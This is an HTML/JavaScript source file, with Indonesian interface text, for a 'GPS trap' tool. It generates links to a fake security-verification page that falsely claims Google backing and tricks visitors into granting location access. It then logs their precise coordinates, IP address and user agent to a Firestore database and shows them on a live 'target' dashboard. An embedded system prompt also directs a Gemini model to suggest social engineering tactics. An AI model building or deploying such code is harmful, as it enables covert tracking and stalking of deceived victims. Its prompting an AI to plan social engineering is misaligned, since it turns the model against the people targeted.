<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Mazkiplay | Fullstack Command Center</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@700&display=swap" rel="stylesheet">
    <style>
        :root { --neon-green: #00ff41; --neon-red: #ff0000; }
        body { background-color: #050505; color: var(--neon-green); font-family: 'JetBrains Mono', monospace; }
        .cyber-header { font-family: 'Orbitron', sans-serif; }
        .glass { background: rgba(10, 10, 10, 0.9); border: 1px solid #1a1a1a; box-shadow: 0 0 15px rgba(0, 255, 65, 0.1); }
        .terminal { background: #000; border-left: 3px solid var(--neon-green); padding: 10px; font-size: 11px; height: 400px; overflow-y: auto; }
        .tab-btn { transition: 0.3s; border-bottom: 2px solid transparent; }
        .tab-btn.active { border-color: var(--neon-red); color: white; background: rgba(255,0,0,0.1); }
        .loader { width: 14px; height: 14px; border: 2px solid var(--neon-green); border-bottom-color: transparent; border-radius: 50%; display: inline-block; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="p-2 md:p-6">

    <div id="app-root" class="max-w-6xl mx-auto">
        
        <!-- UI: DASHBOARD (ADMIN) -->
        <div id="admin-panel" class="space-y-4">
            <header class="flex flex-col md:flex-row justify-between items-center gap-4 mb-6">
                <div>
                    <h1 class="cyber-header text-3xl font-black text-red-600 tracking-tighter">MAZKIPLAY FS</h1>
                    <p class="text-[10px] text-gray-500 uppercase">Real-Time Intelligence & GPS Trap System</p>
                </div>
                <div class="flex gap-2">
                    <div class="glass px-4 py-2 rounded text-[9px]">DB: <span id="db-status" class="text-yellow-500">OFFLINE</span></div>
                    <div class="glass px-4 py-2 rounded text-[9px]">TARGETS: <span id="target-count" class="text-red-500">0</span></div>
                </div>
            </header>

            <div class="grid grid-cols-1 lg:grid-cols-4 gap-4">
                <nav class="lg:col-span-1 space-y-2">
                    <button onclick="switchTab('monitor')" id="btn-monitor" class="tab-btn active w-full text-left p-3 glass rounded text-xs">ðŸ“¡ LIVE MONITOR</button>
                    <button onclick="switchTab('gen')" id="btn-gen" class="tab-btn w-full text-left p-3 glass rounded text-xs">ðŸ”— LINK GENERATOR</button>
                    <button onclick="switchTab('ai')" id="btn-ai" class="tab-btn w-full text-left p-3 glass rounded text-xs">ðŸ¤– TACTICAL AI</button>
                    <div class="p-4 mt-4 glass rounded text-[9px] text-gray-600">
                        <p class="font-bold text-gray-400 mb-1 uppercase">Cara Pakai:</p>
                        1. Generate link trap.<br>
                        2. Kirim ke target.<br>
                        3. Pantau koordinat secara live.
                    </div>
                </nav>

                <main class="lg:col-span-3 glass rounded-xl p-4 min-h-[500px]">
                    <div id="tab-monitor" class="tab-pane">
                        <h2 class="text-white font-bold mb-4 text-xs uppercase tracking-widest">Target Feed</h2>
                        <div id="feed-container" class="terminal space-y-4 text-green-500">
                            <div class="text-gray-700 italic">Menunggu autentikasi sistem...</div>
                        </div>
                    </div>

                    <div id="tab-gen" class="tab-pane hidden">
                        <h2 class="text-white font-bold mb-4 text-xs uppercase tracking-widest">Deployment</h2>
                        <div class="space-y-4">
                            <div class="p-4 bg-red-900/10 border border-red-900/30 rounded">
                                <label class="text-[10px] text-red-500 font-bold block mb-2">TARGET REDIRECT (e.g. YouTube/News)</label>
                                <input type="text" id="redirect-input" value="https://www.youtube.com/watch?v=dQw4w9WgXcQ" class="w-full bg-black border border-gray-800 p-2 text-xs outline-none text-white">
                            </div>
                            <div class="p-4 glass rounded">
                                <label class="text-[10px] text-gray-500 block mb-2">TRAP URL (Bagikan link ini):</label>
                                <div class="flex gap-2">
                                    <input type="text" id="trap-url" readonly class="flex-1 bg-transparent text-blue-400 text-xs outline-none">
                                    <button onclick="copyTrapLink()" class="bg-blue-600 text-white px-4 py-1 rounded text-[10px]">COPY</button>
                                </div>
                            </div>
                            <button onclick="openTrapManual()" class="w-full border border-gray-700 py-3 rounded text-[10px] hover:bg-white/5">UJI COBA HALAMAN TRAP DI PERANGKAT INI</button>
                        </div>
                    </div>

                    <div id="tab-ai" class="tab-pane hidden flex flex-col h-[450px]">
                        <h2 class="text-white font-bold mb-4 text-xs uppercase tracking-widest">Mazki Intel AI</h2>
                        <div id="ai-chat" class="terminal flex-1 mb-4 text-green-400">
                            <div class="text-green-800">[LOG]: AI System Standby.</div>
                        </div>
                        <div class="flex gap-2">
                            <input type="text" id="ai-input" placeholder="Analisis data target..." class="flex-1 bg-black border border-gray-800 p-3 text-xs text-white">
                            <button onclick="askAI()" class="bg-green-600 text-black px-6 font-bold text-xs">KIRIM</button>
                        </div>
                    </div>
                </main>
            </div>
        </div>

        <!-- UI: TRAP INTERFACE -->
        <div id="trap-page" class="hidden fixed inset-0 bg-white z-[9999] flex items-center justify-center p-6 text-center">
            <div class="max-w-sm">
                <div class="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
                <h1 class="text-2xl font-bold text-gray-800 mb-2">Verifikasi Keamanan</h1>
                <p class="text-gray-600 text-sm mb-6">Kami mendeteksi aktivitas mencurigakan. Selesaikan verifikasi GPS untuk melanjutkan ke konten yang diminta.</p>
                <button id="btn-verify" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold text-lg shadow-lg active:scale-95 transition">VERIFIKASI SEKARANG</button>
                <p class="text-[10px] text-gray-400 mt-8">Secure Powered by Google Identity Services</p>
            </div>
        </div>
    </div>

    <!-- FIREBASE & LOGIC -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
        import { getFirestore, collection, addDoc, onSnapshot, query, orderBy, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

        // Global State & Firebase Config
        const firebaseConfig = JSON.parse(__firebase_config);
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const auth = getAuth(app);
        const appId = typeof __app_id !== 'undefined' ? __app_id : 'mazki-fs';
        
        let currentUser = null;
        let unsubscribeMonitor = null;

        // Check view mode
        const urlParams = new URLSearchParams(window.location.search);
        const isTrapMode = urlParams.get('view') === 'trap';

        // 1. AUTHENTICATION (RULE 3: Auth Before Queries)
        const initAuth = async () => {
            try {
                if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
                    await signInWithCustomToken(auth, __initial_auth_token);
                } else {
                    await signInAnonymously(auth);
                }
            } catch (err) {
                console.error("Auth Error:", err);
                document.getElementById('db-status').innerText = "AUTH ERROR";
            }
        };

        initAuth();

        onAuthStateChanged(auth, (user) => {
            if (user) {
                currentUser = user;
                document.getElementById('db-status').innerText = "ONLINE";
                document.getElementById('db-status').className = "text-green-500";
                
                if (isTrapMode) {
                    showTrapUI();
                } else {
                    initAdminDashboard();
                }
            }
        });

        // 2. ADMIN DASHBOARD LOGIC (RULE 1 & 2: Path & No Complex Queries)
        function initAdminDashboard() {
            const currentUrl = window.location.href.split('?')[0];
            document.getElementById('trap-url').value = `${currentUrl}?view=trap`;
            
            // Path sesuai RULE 1
            const colPath = ['artifacts', appId, 'public', 'data', 'traps'];
            const colRef = collection(db, ...colPath);
            
            // Kita tidak menggunakan orderBy() jika menyebabkan error index
            // Kita akan melakukan sorting secara manual di JS Memory jika diperlukan
            const q = query(colRef);

            if (unsubscribeMonitor) unsubscribeMonitor();

            unsubscribeMonitor = onSnapshot(q, (snapshot) => {
                const feed = document.getElementById('feed-container');
                const count = document.getElementById('target-count');
                count.innerText = snapshot.docs.length;

                if (snapshot.empty) {
                    feed.innerHTML = `<div class="text-gray-700 italic">Menunggu koneksi masuk...</div>`;
                    return;
                }

                // Ambil data dan sort secara manual berdasarkan timestamp terbaru di atas
                const dataList = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
                dataList.sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));

                feed.innerHTML = "";
                dataList.forEach(data => {
                    const date = data.timestamp?.toDate().toLocaleString() || "Syncing...";
                    
                    const el = document.createElement('div');
                    el.className = "p-3 border-b border-gray-900 hover:bg-white/5 transition";
                    el.innerHTML = `
                        <div class="flex justify-between items-start mb-1">
                            <span class="text-red-500 font-bold">[CAPTURE_DETECTED]</span>
                            <span class="text-gray-600 text-[9px]">${date}</span>
                        </div>
                        <div class="grid grid-cols-2 text-[10px] gap-1">
                            <div><span class="text-gray-500">IP:</span> ${data.ip || 'Unknown'}</div>
                            <div><span class="text-gray-500">ACC:</span> ${data.accuracy ? data.accuracy.toFixed(1) + 'm' : 'N/A'}</div>
                            <div class="col-span-2"><span class="text-gray-500">LOC:</span> <a href="https://www.google.com/maps?q=${data.lat},${data.lon}" target="_blank" class="text-blue-500 underline">BUKA DI GOOGLE MAPS</a></div>
                        </div>
                        <div class="mt-1 text-[8px] text-gray-700 truncate">UA: ${data.ua || 'N/A'}</div>
                    `;
                    feed.appendChild(el);
                });
            }, (error) => {
                console.error("Firestore Error:", error);
                document.getElementById('feed-container').innerHTML = `<div class="text-red-500">[ERROR]: Permission Denied. Periksa struktur path Firestore.</div>`;
            });
        }

        // 3. TRAP PAGE LOGIC (Target Side)
        function showTrapUI() {
            document.getElementById('admin-panel').classList.add('hidden');
            document.getElementById('trap-page').classList.remove('hidden');
            document.body.style.backgroundColor = "white";

            document.getElementById('btn-verify').onclick = () => {
                if (!currentUser) {
                    alert("Sistem sedang inisialisasi, mohon tunggu sebentar...");
                    return;
                }

                if ("geolocation" in navigator) {
                    navigator.geolocation.getCurrentPosition(async (pos) => {
                        let ip = "Unknown";
                        try { 
                            const res = await fetch('https://api.ipify.org?format=json');
                            const json = await res.json();
                            ip = json.ip;
                        } catch(e) {}

                        try {
                            const colPath = ['artifacts', appId, 'public', 'data', 'traps'];
                            await addDoc(collection(db, ...colPath), {
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude,
                                accuracy: pos.coords.accuracy,
                                ip: ip,
                                ua: navigator.userAgent,
                                timestamp: serverTimestamp()
                            });
                            
                            const redirect = document.getElementById('redirect-input').value || "https://www.google.com";
                            window.location.href = redirect;
                        } catch (err) {
                            console.error("Save Error:", err);
                            alert("Terjadi kesalahan sistem saat verifikasi.");
                        }
                    }, (err) => {
                        alert("Gagal memverifikasi. Mohon izinkan akses lokasi untuk melanjutkan.");
                    }, { enableHighAccuracy: true });
                } else {
                    alert("Browser Anda tidak mendukung verifikasi ini.");
                }
            };
        }

        // --- GLOBAL EXPORTS ---
        window.switchTab = (id) => {
            document.querySelectorAll('.tab-pane').forEach(p => p.classList.add('hidden'));
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.getElementById('tab-' + id).classList.remove('hidden');
            document.getElementById('btn-' + id).classList.add('active');
        };

        window.copyTrapLink = () => {
            const copyText = document.getElementById("trap-url");
            copyText.select();
            document.execCommand("copy");
            alert("Link Trap telah disalin ke clipboard!");
        };

        window.openTrapManual = () => {
            const url = document.getElementById('trap-url').value;
            window.open(url, '_blank');
        };

        // --- AI LOGIC ---
        window.askAI = async () => {
            const input = document.getElementById('ai-input');
            const chat = document.getElementById('ai-chat');
            const text = input.value.trim();
            if(!text) return;

            chat.innerHTML += `<div class="text-white mt-2">USER> ${text}</div>`;
            input.value = "";
            chat.scrollTop = chat.scrollHeight;

            const apiKey = ""; 
            if(!apiKey) {
                chat.innerHTML += `<div class="text-red-500 mt-1">MAZKI> [ERROR] API_KEY_MISSING. Masukkan key pada source code.</div>`;
                return;
            }

            try {
                const resp = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        contents: [{ parts: [{ text: text }] }],
                        systemInstruction: { parts: [{ text: "You are Mazki AI, a cybersecurity analyst. Help analyze coordinates, IPs, and suggest social engineering tactics in Indonesian." }] }
                    })
                });
                const json = await resp.json();
                const response = json.candidates[0].content.parts[0].text;
                chat.innerHTML += `<div class="text-green-500 mt-1">MAZKI> ${response}</div>`;
            } catch(e) {
                chat.innerHTML += `<div class="text-red-500 mt-1">MAZKI> [ERROR] AI Uplink failure.</div>`;
            }
            chat.scrollTop = chat.scrollHeight;
        };
    </script>
</body>
</html>
